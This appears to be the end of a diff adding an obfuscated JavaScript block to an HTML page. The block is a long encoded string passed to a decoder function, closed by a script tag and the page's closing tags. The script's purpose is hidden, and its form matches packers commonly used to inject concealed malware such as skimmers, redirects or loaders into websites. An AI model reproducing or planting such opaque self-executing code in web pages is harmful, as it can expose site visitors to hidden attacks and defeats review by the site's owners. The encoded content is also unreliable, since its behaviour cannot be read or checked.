ceerceLrceTrcATrcjArTerczUrczzreLrcejrceTrcTArceUrczUrALrTTrjerTTrALrczzrcejrceTrcTArceUrTTrcTjrcezrcTArcejrcejrczcrTercezrceLrcejrcejrecrcejrcAArcALrceUrcTArcezrTerczUrczzreLrcejrceTrcTArceUrczUrALrUzcrTTrczzreLrcejrceTrcTArceUrczUrTTrczzreLrcAzrcAArcjUrczUrTTrcTTrAAreUrcAerceLrcAArceUrATrTerTerAArjjrTTrUzcrTTrcAUrcjcrceUrcTjrcjzrcAArceLrceUrTTrcejrcATrceLrcjLrcUUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrATrcjzrcjArceTrcAcrezrTTrcecrcAcrcejrcejrcTArcALrcAcrAArTTrcjjrTTrcTjrceLrceUrcejrcjzrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcTjrceercAcrcTArcjzrcAcrcccrcezrcAcrcecrcAcrceUrcjzrATrALrcAzrcAArcjUrALrAArjjrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrcTjrcezrcTArcejrcejrcUUrcTArcecrcAcrTTrczcrTTrcTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrTTrAzrcjjrcjzrcjArceTrcAcrUzcrcTTrjjrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrcAArceUrceUrcAcrceerccTrcLzrcUcrcUzrTTrczcrTTrcTTrTTrczzrcejrceTrcTArceUrTTrcTjrcezrcTArcejrcejrczcrTerceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrecrcjzrcAcrcjTrcjzrTerczUrAzrcjjrcecrcAcrcejrcejrcTArcALrcAcrUzcrczzreLrcejrceTrcTArceUrczUrTTrczzrcejrceTrcTArceUrTTrcTjrcezrcTArcejrcejrczcrTerceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrecrcTjrcezrceLrcejrcAcrTerczUrLTerUTzrULUrczzreLrcejrceTrcTArceUrczUrTTrcTTrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcTerceLrcAzrcjAreUrcTArceTrceTrcAcrceUrcAzrczjrcATrcAArcezrcAzrATrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrAArjjrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrceArcjcrcAcrceercjArcUjrcAcrcezrcAcrcTjrcjzrceLrceerATrALreUrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUrecrcTjrcezrceLrcejrcAcrALrAAreUrcTArcAzrcAzrcccrcjUrcAcrceUrcjzrcUzrcAArcejrcjzrcAcrceUrcAcrceerATrALrcTjrcezrcAArcTjrcAjrALrezrTTrATrAArTTrczcrczUrTTrcjjrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrcejrcjzrcjArcezrcAcreUrcTArceUrcAArcecrcTArcjzrcAArceLrceUrTTrczcrTTrALrcejrcezrcAArcAzrcAcrcULrcjcrcjzrTTreTreUrejrcejrTTrcAcrcTArcejrcAcrTTrcAUrceLrceercjLrcTArceercAzrcejrALrjjrTTrcejrcAcrcjzrcLzrcAArcecrcAcrceLrcjcrcjzrATrATrAArTTrczcrczUrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrceercAcrcecrceLrcjUrcAcrATrAArezrTTrejreTreTrAArjjrTTrUzcrAArjjrTTrcejrcAcrcjzrcLzrcAArcecrcAcrceLrcjcrcjzrATrATrAArTTrczcrczUrTTrcjjrTTrcAArcAUrTTrATrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrceTrcTArceercAcrceUrcjzrcccrcezrcAcrcecrcAcrceUrcjzrAArTTrcjjrTTrceUrceLrcjzrcAArcAUrcAArcTjrcTArcjzrcAArceLrceUreUrceercAcrcecrceLrcjUrcAcrATrAArjjrTTrUzcrTTrUzcrezrTTrejrjcreTreTrAArjjrTTrUzcrTTrcAUrcjcrceUrcTjrcjzrcAArceLrceUrTTrcjcrceTrcAzrcTArcjzrcAcrczArceUrcTArcezrcjArcejrcAArcejrATrceercAcrcejrcjcrcezrcjzrAArTTrcjjrTTrcjzrceLrcjzrcTArcezrczercAcrcjzrcejrAjrAjrjjrTTrcAArcAUrTTrATrceercAcrcejrcjcrcezrcjzrTTrczcrczcrczcrTTrTercLLrccArcUUrTerAArTTrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrAjrAjrjjrTTrcAcrcezrcejrcAcrTTrcAArcAUrTTrATrceercAcrcejrcjcrcezrcjzrTTrczcrczcrczcrTTrTercUzrcULrcUjrcUjrTerAArTTrcjzrceLrcjzrcTArcezrcUzrceLrcejrcejrcAcrcejrAjrAjrjjrTTrcTjrceLrceUrcejrcjzrTTrcjLrcAArceUrczArcTjrcTjrcjcrceercTArcTjrcjArTTrczcrTTrcjzrceLrcjzrcTArcezrczercAcrcjzrcejrTTrczcrczcrczcrTTreTrTTrczLrTTreTrTTrjerTTrATrATrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrTTreLrTTrcjzrceLrcjzrcTArcezrczercAcrcjzrcejrAArTTrAerTTreAreTreTrAAreUrcjzrceLrccUrcAArcjTrcAcrcAzrATreerAArjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjLrcAArceUrczArcTjrcTjrcjcrceercTArcTjrcjArALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrcTTrAzrcjjrcjLrcAArceUrczArcTjrcTjrcjcrceercTArcTjrcjArUzcrAcrcTTrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjzrceLrcjzrcTArcezrcUzrceLrcejrcejrcAcrcejrALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrcjzrceLrcjzrcTArcezrcUzrceLrcejrcejrcAcrcejrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcejrcAcrceercjUrcAcrceercUjrcjzrcTArcjzrcjcrcejrALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrTerczjrceLrceUrceUrcAcrcTjrcjzrcAcrcAzrTerjjrTTrcjLrcAArceUrcUercTArcjzrcAcrccUrcAArcezrcezreUrcejrcjzrcjArcezrcAcreUrcjLrcAArcAzrcjzrcATrTTrczcrTTrcTTrAzrcjjrcjLrcAArceUrczArcTjrcTjrcjcrceercTArcTjrcjArUzcrAcrcTTrjjrTTrUzcrTTrcAUrcjcrceUrcTjrcjzrcAArceLrceUrTTrcTjrcezrcAcrcTArceerccTrcAArcejrcjzrceLrceercjArATrAArTTrcjjrTTrcATrcAArcejrcjzrceLrceercjArTTrczcrTTrcLjrcTcrjjrTTrcjzrceLrcjzrcTArcezrczercAcrcjzrcejrTTrczcrTTreTrjjrTTrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrTTrczcrTTreTrjjrTTrcjzrceLrcjzrcTArcezrcUzrceLrcejrcejrcAcrcejrTTrczcrTTreTrjjrTTrcjLrcAArceUrczjrceLrcjcrceUrcjzrTTrczcrTTreTrjjrTTrcezrceLrcejrcejrcUjrcjzrceercAcrcTArcAjrTTrczcrTTreTrjjrTTrcejrcAcrceercjUrcAcrceercLLrcAArceUrcejrTTrczcrTTreTrjjrTTrcejrcAcrceercjUrcAcrceercUzrceLrcejrcejrcAcrcejrTTrczcrTTreTrjjrTTrcecrcjcrcejrcjzrczjrcATrcTArceUrcALrcAcrcUjrcAcrceercjUrcAcrceerTTrczcrTTrcAUrcTArcezrcejrcAcrjjrTTrcecrceLrcejrcjzrccUrceercAcrceArcjcrcAcrceUrcjzrcccrcezrcAcrcecrcAcrceUrcjzreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrALrecrALrjjrTTrcezrcAcrcTArcejrcjzrccUrceercAcrceArcjcrcAcrceUrcjzrcccrcezrcAcrcecrcAcrceUrcjzreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrALrecrALrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjLrcAArceUrczArcTjrcTjrcjcrceercTArcTjrcjArALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrTereTrAcrTerjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrALreTrALrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjzrceLrcjzrcTArcezrcUzrceLrcejrcejrcAcrcejrALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrALreTrALrjjrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcejrcAcrceercjUrcAcrceercUjrcjzrcTArcjzrcjcrcejrALrAAreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrTerczjrceLrceUrceUrcAcrcTjrcjzrcAcrcAzrTerjjrTTrcjLrcAArceUrcUercTArcjzrcAcrccUrcAArcezrcezreUrcejrcjzrcjArcezrcAcreUrcjLrcAArcAzrcjzrcATrTTrczcrTTrALreTrAcrALrjjrTTrceercAcrceUrcAzrcAcrceerccTrcAArcejrcjzrceLrceercjArATrAArjjrTTrUzcrTTrcejrcAcrcjzrccArceUrcjzrcAcrceercjUrcTArcezrATrcjcrceTrcAzrcTArcjzrcAcrcUTrcAcrceercAArceLrcAzrczArceUrcAzrcLzrcAArcecrcAcrceerezrTTreAreTreTreTrAArjjrcer",10,"zcULTAejr",4,8,47))</script>
+
+</body>
+</html>
